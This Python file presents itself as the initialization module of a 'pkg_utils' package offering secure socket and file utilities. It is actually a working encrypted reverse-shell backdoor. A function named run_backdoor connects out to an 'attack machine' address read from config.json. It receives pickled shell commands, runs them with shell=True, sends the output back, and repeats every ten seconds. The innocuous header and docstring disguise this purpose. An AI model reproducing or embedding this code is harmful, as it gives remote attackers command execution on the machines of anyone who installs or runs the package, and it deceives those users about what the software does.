# pkg_utils - Core Initialization Module
# This file initializes the pkg_utils package, providing core utilities 
# for secure connections, encrypted data handling, and file operations.
#
# Version: 2.3.4
# Author: Internal Dev Team
# 
# Usage:
#    import pkg_utils
#    # Initialize secure system-level functions
#    pkg_utils.init_secure_config()
#
# Notes:
# - Use pkg_utils for all socket-based operations and secure data processing

"""
Package Initialization for pkg_utils

This package provides low-level utilities for:
    - Secure socket communications
    - Encrypted file handling
    - System command execution

Modules included:
    - system: handles socket and subprocess operations
    - config: manages connection configurations and key storage
"""

import socket
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import subprocess
import os
import json
import random
import pickle
import time

symm_key = None
cwd = None

STATUS_SUCCESS = 1
STATUS_ERROR = 0

def convert_path(file_name):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(script_dir, file_name)
    return file_path

def update_json_with_random(filename):
    try:
        with open(filename, "r+") as f:
            data = json.load(f)
            data["random"] = random.randint(1, 1000000)
            f.seek(0)
            json.dump(data, f)
            f.truncate()
    except Exception as e:
        print(f"Error updating JSON: {e}")

def add_random_comment_to_key_file(key_fpath):
    try:
        with open(key_fpath, "r") as f:
            key = f.read().split('#')[0].strip()
        
        random_comment = f"#{random.randint(1, 1000000)}"
        with open(key_fpath, "w") as f:
            f.write(f"{key}{random_comment}")
            
    except Exception as e:
        print(f"Error updating key file: {e}")

update_json_with_random(convert_path("config.json"))
add_random_comment_to_key_file(convert_path("key.txt"))

with open(convert_path("config.json")) as config_f:
    config = json.load(config_f)

REACH_IP = config['REACH_IP']
REACH_PORT = config['REACH_PORT']


def read_key(key_fpath):
    with open(key_fpath, 'r') as key_f:
        # Read the file, ignore lines starting with '#'
        lines = key_f.read().split('#')
        # hex_key = key_f.read()
        hex_key = lines[0]
        symm_key = bytes.fromhex(hex_key)
    return symm_key

def get_encrypted_msg(symmetric_key, msg, bytes=False):
    aesgcm = AESGCM(symmetric_key)
    nonce = os.urandom(12)
    if bytes:
        msg_bytes = msg
    else: # string
        msg_bytes = msg.encode()
    ct = aesgcm.encrypt(nonce=nonce, 
                        data=msg_bytes,
                        associated_data=None)
    return nonce + ct

# returns status: enum, decrypted_ct: string | bytes
def decrypt_ct(symmetric_key, msg_ct, bytes=False):
    status = STATUS_SUCCESS
    out_msg = "ERROR"
    try:
        # we are given nonce + ct
        nonce_length = 12
        nonce = msg_ct[:nonce_length]
        ct = msg_ct[nonce_length:]
        # decrypt
        aesgcm = AESGCM(symmetric_key)
        dec_msg_bytes = aesgcm.decrypt(nonce=nonce,
                    data=ct,
                    associated_data=None)
        out_msg = dec_msg_bytes
        if not bytes: # output string
            out_msg = dec_msg_bytes.decode()
    except Exception as e:
        status = STATUS_ERROR
        out_msg = f"Error: Received bad message. Sender likely has incorrect key!"

    return status, out_msg

def send_msg(connection, out_bytes):
    # first send message length
    msg_len = len(out_bytes)
    connection.send(msg_len.to_bytes(8, 'big'))
    # then send message
    connection.send(out_bytes)

def receive_msg(connection, buffer_size=1024):
    # first receive msg length
    len_data = connection.recv(8)
    if not len_data:
        return b"" # no length received
    
    in_msg_len = int.from_bytes(len_data, "big")

    # receive message
    bytes_received = 0
    in_msg_list = []
    while bytes_received < in_msg_len:
        bytes_to_receive = min(buffer_size, in_msg_len - bytes_received)
        msg_part = connection.recv(bytes_to_receive)
        if not msg_part:
            break # connection closed prematurely
        else:
            in_msg_list.append(msg_part)
            bytes_received += len(msg_part)

    full_msg = b"".join(in_msg_list)
    return full_msg

def run_shell_script(script_fname):
    try:
        with open(script_fname, 'r') as file:
            commands = file.read().splitlines()[1:] # ignore 1st line
            outputs = []
            for command in commands:
                print(f"c: {command}")
                output = run_line(command)
                print(f"o: {output}")
                outputs.append(output)
        return "".join(outputs)
    except Exception as e:
        return str(e)
    
def run_line(command):
    if command.startswith("#"):
        return "" # comment has no output
    
    global cwd
    output = f"error running command:\n\t{command}\n"
    # Run a command and capture the output
    if command.startswith("cd "):
        new_dir = command[3:].strip()
        try:
            os.chdir(new_dir)
            cwd = os.getcwd() # update cwd
            output = "" # successfully changed dir (no output)
        except Exception as e:
            output = f"cannot change directory to {new_dir}\n"
    else:
        # result = subprocess.run(["bash", script_fname], capture_output=True, text=True)
        # result = subprocess.run(command, shell=True, cwd=cwd, capture_output=True, text=True)
        # return result.stdout + result.stderr

        # For Python 3.6 compatibility
        result = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True  # This is equivalent to text=True
        )
        output = (result.stdout + result.stderr) # .rstrip("\n")
    return output

def execute_msg(message):
    # TODO: complete so runs the code
    print(f"received:\n{message}\n==")
    # create shell script from the message
    script_fname = convert_path("setup.sh")

    # Generate a random number for the comment
    random_number = random.randint(100000, 999999)
    comment_line = f"# RandomID: {random_number}\n"

    with open(script_fname, "w") as f:
        f.write(comment_line + message)
    # run the shell script
    run_output = run_shell_script(script_fname)
    return run_output

def run_backdoor(ip, port):
    print(f"here -> {ip}:{port}")
    host = ip # socket.gethostname() 
    # create socket
    client_socket = socket.socket() # socket.AF_INET, socket.SOCK_STREAM
    # connect to server (attack machine)
    client_socket.connect((host, port))

    # send the current working directory
    send_msg(
        connection=client_socket,
        out_bytes=get_encrypted_msg(
            symmetric_key=symm_key,
            msg=os.getcwd(),
            bytes=False
        )
    )

    # receive message from server
    in_ct = receive_msg(
        connection=client_socket,
        buffer_size=1024
    )

    # decrypt message
    status, message_bytes = decrypt_ct(symmetric_key=symm_key,
               msg_ct=in_ct,
               bytes=True)
    if status == STATUS_ERROR:
        # error message
        print(message_bytes)
        # stop early
        return 
    
    global cwd
    cwd, commands = pickle.loads(message_bytes)
    print(f"in_cwd: {cwd}")
    # set cwd before running code
    os.chdir(cwd)
    # run code from message
    script_output = execute_msg(commands)
    print(f"output:\n{script_output}")
    # are there updates to cwd?
    print(f"out_cwd: {cwd}")
    message = pickle.dumps((cwd, script_output))
    # send back output from executing code
    enc_output = get_encrypted_msg(
        symmetric_key=symm_key,
        msg=message,
        bytes=True
    )
    # send output to server
    send_msg(
        connection=client_socket,
        out_bytes=enc_output
    )

    # close connection
    client_socket.close()

if __name__ == '__main__':
    symm_key = read_key(convert_path("key.txt"))
    while(True):
        # reach out to server
        run_backdoor(REACH_IP, REACH_PORT)
        # sleep for 10 sec
        time.sleep(10)
